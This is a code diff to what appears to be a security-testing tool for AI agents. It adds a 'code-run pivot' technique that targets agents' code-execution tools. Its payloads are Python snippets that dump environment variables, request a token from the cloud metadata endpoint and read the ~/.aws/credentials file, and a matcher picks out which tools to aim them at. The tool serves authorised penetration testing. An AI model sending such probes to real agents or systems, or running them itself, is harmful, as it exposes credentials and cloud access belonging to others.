@@ -244,6 +244,41 @@ def _paas_envvar_pivot_payloads() -> list[dict]:
     ]
 
 
+def _code_run_pivot_payloads() -> list[dict]:
+    """
+    EP-T11 — code-run pivot. Targets GenericAgent-class ``code_run``
+    (and equivalent `run_code` / `python_exec` / `eval`) surfaces —
+    the single highest-value primitive in the autonomous-agent threat
+    model. A landing means the target will install arbitrary packages,
+    write scripts, and call external APIs on the attacker's behalf.
+
+    Each payload is a benign-looking Python snippet that, if the
+    surface actually evaluates code, emits a response containing
+    credential-like / environment-like content the EP-11 detector
+    layer already knows how to score. No remote side effects —
+    payloads read local state only so the probe is safe to fire in
+    pen-test engagements.
+    """
+    return [
+        # Snippet A — environment dump via Python stdlib.
+        {"code": "import os; print('\\n'.join(f'{k}={v}' for k, v "
+                 "in os.environ.items()))"},
+        # Snippet B — IMDSv2 reachability check via Python.
+        {"code": "import urllib.request as u, json; "
+                 "r = u.urlopen('http://169.254.169.254/latest/api/"
+                 "token', timeout=1); print(r.read()[:200])"},
+        # Snippet C — known SaaS credential file read.
+        {"code": "import pathlib; "
+                 "p = pathlib.Path.home() / '.aws' / 'credentials'; "
+                 "print(p.read_text()[:400] if p.exists() else 'no-aws')"},
+        # Snippet D — request to pip / distinct install surface (the
+        # autonomous-agent "crystallise a tool" hazard).
+        {"code": "import subprocess; "
+                 "print(subprocess.run(['pip', 'list', '--format=freeze'], "
+                 "capture_output=True, text=True).stdout[:400])"},
+    ]
+
+
 # ── Technique registry ──────────────────────────────────────────────────────
 
 @dataclass
@@ -278,6 +313,27 @@ def _is_oauth_surface(s: Surface) -> bool:
     d = (s.description or "").lower()
     return ("oauth" in n or "oauth" in d or "token" in n or
             "auth" in n or "workspace" in d or "integration" in d)
+
+
+def _is_code_run_surface(s: Surface) -> bool:
+    """
+    EP-T11 surface matcher. The GenericAgent-class primitive: a tool
+    whose job is to execute attacker-supplied code. Includes
+    ``code_run`` (lsdefine/GenericAgent), ``tool:eval`` /
+    ``tool:python_exec`` / ``tool:run_code`` and any tool whose
+    description explicitly mentions executing arbitrary code.
+    """
+    n = s.name.lower()
+    d = (s.description or "").lower()
+    if any(k in n for k in (
+        "tool:code_run", "tool:run_code", "tool:python_exec",
+        "tool:python_run", "tool:eval", "tool:execute_code",
+    )):
+        return True
+    return ("execute arbitrary code" in d
+            or "run arbitrary code" in d
+            or "python repl" in d
+            or "code execution" in d)
 
 
 TECHNIQUES: dict[str, Technique] = {
@@ -322,6 +378,11 @@ TECHNIQUES: dict[str, Technique] = {
         id="EP-T10-paas-envvar-pivot", family="D", kind="probe",
         payload_fn=_paas_envvar_pivot_payloads,
         surface_match=_is_fetch_surface),
+    "EP-T11-code-run-pivot": Technique(
+        id="EP-T11-code-run-pivot", family="A", kind="probe",
+        payload_fn=_code_run_pivot_payloads,
+        surface_match=_is_code_run_surface,
+        severity="CRITICAL"),
 }
 
 
